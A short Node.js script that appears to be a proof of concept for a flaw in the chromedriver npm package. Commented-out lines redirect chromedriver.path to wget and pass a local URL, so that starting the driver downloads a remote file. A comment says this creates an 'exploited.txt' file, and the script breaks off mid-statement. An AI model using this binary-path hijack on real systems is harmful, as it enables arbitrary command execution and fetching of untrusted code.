'use strict'

const chromedriver = require('chromedriver');

//const args = ['http://127.0.0.1:8000/app.js'];
const args = [];
const returnPromise = false;

//chromedriver.path = '/opt/homebrew/bin/wget';

// This creates a local 'exploited.txt' file.
chromedriver.start(args, returnPromise);

chromedriver.